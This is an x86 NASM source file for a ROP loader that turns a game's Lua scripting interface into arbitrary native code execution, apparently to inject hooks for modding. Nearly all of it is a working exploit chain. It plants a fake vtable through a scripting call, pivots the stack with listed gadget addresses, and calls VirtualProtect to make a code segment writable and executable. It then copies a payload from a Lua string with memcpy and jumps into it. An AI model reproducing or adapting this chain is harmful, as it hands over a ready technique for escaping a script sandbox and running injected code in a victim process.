%include 'globals.inc'

bits 32
section text
org 0

; ROP loader
; copied onto eObj, 0's are ignored
; full restore using lua

; vtable modification, by Logic.SetEntityScriptingValue(-58, vtable)
; execution by Logic.HeroSetActionPoints(eID, val_for_esi, extra_payload)
; results in call [vtable+40], edi and esi are caller saved!
; 2 args, thiscall, this: CEventValue obj, eax: entity obj ptr, esi: 2nd arg

stage0:         
        dd 402100h          ; fake vtable, HeroSetActionPoints @ [vt+40]
;;[vt+40]: 4020E6h          ; push, push, call esi
;;    esi: 72B479h          ; xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
        dd 40FCB5h          ; add esp, 4 ; ret
        dd 0            ;D eID, do not overwrite!
        dd 58A6CFh          ; push eax ; pop eax ; ret 4
        
        ; yo dawg, i herd u liek stack pivots...
        ; Set up a ROP chain on the actual stack, pivot to it, run VirtualProtect and pivot back
        
        dd 5D4014h			; sub eax, 0x30 ; ret
        dd 1            ;D dummy for ret 4
        
        dd 402223h          ; pop ecx ; ret
        dd 40142Bh  ;D pop eax ; ret
        dd 42E17Fh			; mov dword ptr [eax + 4], ecx ; ret
		dd 40235Fh 			; mov dword ptr [eax + 0x20], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
        dd virtualProtect ;D import ptr to VirtualProtect
        dd 490654h			; mov dword ptr [eax + 8], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
        dd 48A71Bh  ;D call [eax] ; ret
        dd 4848D0h			; mov dword ptr [eax + 0xc], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
		dd 401000h  ;D start of segment 
        dd 4961C8h 			; mov dword ptr [eax + 0x10], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
        dd 64B000h  ;D length
        dd 484C5Dh 			; mov dword ptr [eax + 0x14], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
        dd 40h      ;D new access: R/W/X
        dd 484CD6h 			; mov dword ptr [eax + 0x18], ecx ; ret
        
        dd 402223h          ; pop ecx ; ret
        dd 856A28h  ;D dummy ptr, old permissions
        dd 40740Dh 			; mov dword ptr [eax + 0x1c], ecx ; ret
        
; already written earlier
;       dd 402223h          ; pop ecx ; ret
;		dd 40142Bh  ;D pop eax ; ret
;		dd 40235Fh 			; mov dword ptr [eax + 0x20], ecx ; ret
            
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; ecx = pivot base
        dd 4035A8h 			; xor eax, eax ; ret						; null & reset SF
        dd 595842h			; add eax, esp ; pop edi ; js 0x59584c ; ret
		dd 1			;D dummy, pop'd
        dd 5B9E9Ah			; add eax, 0x24 ; ret 4
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; eax = pivot base, ecx = return_after_pivot
		dd 1			;D dummy, ret 4
        dd 4B92C5h 			; mov dword ptr [eax + 0x24], ecx ; ret

        dd 402223h          ; pop ecx ; ret
        dd 72B479h	;D xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
        dd 4493D5h 			; mov dword ptr [eax + 0x28], ecx ; ret
        
        
        ; heere we gooo
        dd 72B479h			; xchg eax, esp ; pop edi ; test dword ptr [eax], eax ; ret
        
return_after_pivot:
        dd 1			;D dummy, gets pop'd into edi
        
        dd 402223h          ; pop ecx ; ret
        dd luaHandle
        dd 6EFC33h          ; mov ecx, dword ptr [ecx] ; (trash eax) ; ret
        dd 40142Bh          ; pop eax ; ret
        dd shok_lua_tostring
        dd 5F521Bh          ; mov dword ptr [esp + 4], ecx ; jmp eax

        
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; ecx = base
        dd 0            ;D dummy, gets overwritten with L <ecx>
        dd 3            ;D lua tostring, arg2 = 3
        
        dd 402480h          ; mov eax, dword ptr [ecx + 4] ; ret        ; eax = size, ecx = base
        dd 5C3F82h          ; pop edx ; ret                             ; edx = memcpy
        dd memcpy       ;D memcpy ptr -> edx        
        dd 42C2F9h          ; mov dword ptr [ecx + 4], edx ; ret        ; [base + 4] = memcpy
        dd 637B4Ch          ; xchg eax, ecx ; ret                       ; eax = base, ecx = size
        dd 5FA700h          ; xchg eax, edx ; ret                       ; ecx = size, edx = base
        dd 40142Bh          ; pop eax ; ret                             ; eax = 5d0e34
        dd 5D0E34h      ;D prepare addr, then jmp to _after_ the next instruction        
        dd 5FDABBh          ; mov dword ptr [esp + 0x10], ecx ; jmp eax     ; store memcpy size
        ;; 5D0E34h (eax)    ; mov eax, dword ptr [edx + 4] ; ret            ; eax = memcpy
        dd 5FDC5Eh          ; mov dword ptr [esp + 8], edx ; jmp eax        ; store memcpy src, call memcpy
        
        dd 47179Dh          ; jmp dword ptr [eax]                       ; return addr after memcpy(), eax = base, jmp to [base]
        dd hookBase     ;D memcpy dst
        dd 0            ;D memcpy src
        dd 0            ;D memcpy size